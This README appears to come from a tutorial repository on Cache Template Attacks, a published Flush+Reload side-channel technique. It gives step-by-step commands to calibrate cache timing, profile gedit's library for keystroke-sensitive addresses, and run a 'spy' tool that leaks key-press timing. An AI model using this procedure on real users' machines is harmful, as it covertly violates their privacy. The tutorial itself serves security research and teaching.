# Cache Template Attacks

Cache Template Attacks are a generic attack technique, allowing to profile and **exploit cache-based information leakage of any program automatically**, without prior knowledge of specific software versions or even specific system information.

The "[Cache Template Attacks](https://www.usenix.org/conference/usenixsecurity15/technical-sessions/presentation/gruss)" paper was presented by Gruss, Spreitzer and Mangard (USENIX Security 2015). The underlying cache attack used is Flush+Reload as presented by Yarom and Falkner in "[FLUSH+RELOAD: a High Resolution, Low Noise, L3 Cache Side-Channel Attack](https://www.usenix.org/conference/usenixsecurity14/technical-sessions/presentation/yarom)" (USENIX Security 2014).

This repository is intended to be a **tutorial to perform a side-channel attack on key presses timing in text editors**. The attack is performed in three steps, that can be found in their respective folders.


-----
## One note before starting

The programs should work on x86-64 Intel CPUs, and **the examples of usage have been tested to run for gedit on Ubuntu 18.04**. The Cache Template Attacks technique is independent of the operating system. More OS specific version of the tools, as well as other tools, are provided in the [IAIK repository](https://github.com/IAIK/cache_template_attacks).

**Warning:** This code is provided as-is. You are responsible for protecting yourself, your property and data, and others from any risks caused by this code. This code may not detect vulnerabilities of your applications. This code is only for testing purposes. Use it only on test systems which contain no sensitive data.


-----
## Step #1: Calibration
Before starting the Cache Template Attack you have to find the cache hit/miss threshold of your system.

Use the calibration tool for this purpose, in the **calibration folder**:
```
cd calibration
make
./calibration
```
This program should print a histogram for cache hits and cache misses. 

Based on the histogram, your first task is to find a suitable threshold value.

**Note:** In the other two programs a constant ```MIN_CACHE_MISS_CYCLES``` is defined. Change it based on your threshold, if necessary.


-----
## Step #2: Key press profiling
In our example, we monitor well observable events like key presses on a text editor, e.g. gedit. You find the profiling tools in the **profiling folder**.

We first find the address range to attack.
```
$ cat /proc/`ps -A | grep gedit | grep -oE "^[0-9]+"`/maps | grep r-x | grep libgedit
7fe1cabb6000-7fe1cac8f000 r-xp 00000000 fd:01 6423718                    /usr/lib/x86_64-linux-gnu/gedit/libgedit.so
```
We do not care about the virtual addresses, but only the size of the address range and the offset in the file (which is 00000000 in this example). 

This line can directly be passed to the profiling tool in this step, where we create a template. This tool requires you to generate the events somehow. We want to profile key presses, so the simplest way to do it is to just **jam a key while the profiling tool is running**, and create a Cache Template showing which addresses react on this key press. 

Run the following commands to find keypress information leakage in gedit (the program should be running and it should have focus as soon as you started the spy script):
```
cd profiling
make
sleep 3; ./profiling 200 7faec85f5000-7faec86cf000 r-xp 20000 fd:01 11930745                   /usr/lib/x86_64-linux-gnu/gedit/libgedit.so # in our example we profile keypresses in gedit
```

You are generally looking for addresses which have high peaks, like the following (done while pressing the key N in gedit):
```
/usr/lib/x86_64-linux-gnu/gedit/libgedit.so, 0x242c0,   7
/usr/lib/x86_64-linux-gnu/gedit/libgedit.so, 0x24300,   4
/usr/lib/x86_64-linux-gnu/gedit/libgedit.so, 0x24340,   3
/usr/lib/x86_64-linux-gnu/gedit/libgedit.so, 0x24380,   7
/usr/lib/x86_64-linux-gnu/gedit/libgedit.so, 0x243c0,  29
/usr/lib/x86_64-linux-gnu/gedit/libgedit.so, 0x24400,  32
/usr/lib/x86_64-linux-gnu/gedit/libgedit.so, 0x24440,  10
/usr/lib/x86_64-linux-gnu/gedit/libgedit.so, 0x24480,   9
/usr/lib/x86_64-linux-gnu/gedit/libgedit.so, 0x244c0,  13
/usr/lib/x86_64-linux-gnu/gedit/libgedit.so, 0x24500,   8
/usr/lib/x86_64-linux-gnu/gedit/libgedit.so, 0x24540,   5
/usr/lib/x86_64-linux-gnu/gedit/libgedit.so, 0x24580,   8
/usr/lib/x86_64-linux-gnu/gedit/libgedit.so, 0x245c0,  13
/usr/lib/x86_64-linux-gnu/gedit/libgedit.so, 0x24600,   6
```
The address 0x24400 had 32 cache hits during a probe duration of 200µs.

**Note down a few suitable addresses** with such high peaks. To filter false positive cache hits we should then perform a second profiling scan without jamming a key.

**Note:** Cache Template Attacks can be fully automated, but this requires the event to be automated as well. Out of scope of this tutorial, you can use libxdotool for this purpose. 



-----
## Step #3: Key presses

Switch to an already opened gedit window before ./spy is started, and try one of the addresses you noted down in step #2, by running the following lines:
```
cd exploitation
make
sleep 3; ./spy /usr/lib/x86_64-linux-gnu/gedit/libgedit.so <addr>
```


